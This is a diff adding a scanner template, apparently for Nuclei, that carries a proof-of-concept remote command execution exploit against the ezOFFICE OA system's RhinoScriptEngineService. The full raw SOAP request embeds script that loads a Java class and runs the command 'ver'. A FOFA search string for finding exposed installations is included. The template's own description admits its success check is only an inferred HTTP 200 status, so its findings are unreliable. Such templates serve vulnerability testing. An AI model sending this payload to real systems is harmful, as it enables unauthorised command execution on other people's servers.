@@ -1,0 +1,21 @@
+id: poc-ksye1uv7x1ebz52z
+info:
+  name: 万户OA ezOffice-RhinoScriptEngineService存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ksye1uv7x1ebz52z
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ksye1uv7x1ebz52z
+    fofa: app="万户网络-ezOFFICE"
+http:
+- raw:
+  - "POST //defaultroot/services/./././RhinoScriptEngineService HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Moziilla/5.0 (compatible; Yahoo! Slurp;http://help.yahoo.com/help/us/ysearch/slurp)\nContent-Type: text/xml; charset=utf-8\nSOAPAction: \"\"\n\n<?xml version='1.0' encoding='UTF-8'?>\n  <soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:jav=\"http://javascript.script.sun.com\">\n    <soapenv:Body>\n      <eval xmlns=\"http://127.0.0.1:8080/services/scriptEngine\">\n        <arg0 xmlns=\"\">\n          <![CDATA[\n          try {\n          load(\"nashorn:Moziilla_compat.js\");\n          } catch (e) {\n          }\n          importPackage(Packages.java.io);\n          importPackage(Packages.java.lang);\n          importPackage(Packages.java.util);\n          importPackage(Packages.java.net);\n\n          new URLClassLoader([new File('../server').toURL()]).loadClass('Test12').getConstructor([Class.forName(\"java.lang.String\")]).newInstance([\"ver\"]).toString()\n\n\n          ]]>\n        </arg0>\n        <arg1 xmlns=\"\" xsi:type=\"urn:SimpleScriptContext\" xmlns:urn=\"urn:beanservice\">\n        </arg1>\n      </eval>\n    </soapenv:Body>\n  </soapenv:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
